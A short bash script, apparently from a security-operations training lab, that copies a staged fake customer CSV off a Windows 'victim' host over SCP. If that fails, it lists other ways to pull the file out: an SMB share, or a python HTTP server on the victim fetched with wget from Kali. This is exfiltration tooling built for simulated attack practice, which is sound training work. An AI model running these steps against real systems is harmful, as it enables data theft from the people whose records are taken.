#!/usr/bin/env bash
# Pull staged "sensitive" file from Windows via SCP or simple HTTP (LAB ONLY)
# Prereq: OpenSSH server on Windows OR shared folder / python http on victim
# Usage: ./04_exfil_pull.sh [victim_ip] [user]

set -euo pipefail

VICTIM="${1:-192.168.56.20}"
USER="${2:-labuser}"
OUTDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../Reports/raw" && pwd)"
mkdir -p "${OUTDIR}"
STAMP="$(date +%Y%m%d-%H%M%S)"

echo "[*] Attempting SCP pull from ${USER}@${VICTIM} ..."
echo "[*] Default remote path: Desktop/soc-lab-exfil/customer_export_fake.csv"
REMOTE="C:/Users/${USER}/Desktop/soc-lab-exfil/customer_export_fake.csv"

if scp "${USER}@${VICTIM}:${REMOTE}" "${OUTDIR}/exfil-${STAMP}.csv"; then
  echo "[+] Saved ${OUTDIR}/exfil-${STAMP}.csv"
  ls -lh "${OUTDIR}/exfil-${STAMP}.csv"
else
  echo "[!] SCP failed. Alternatives:"
  echo "    1) Enable OpenSSH Server on Windows"
  echo "    2) Use SMB share + 04_data_transfer.ps1 -DestShare"
  echo "    3) On victim: python -m http.server 8000 in the exfil folder; wget from Kali"
fi
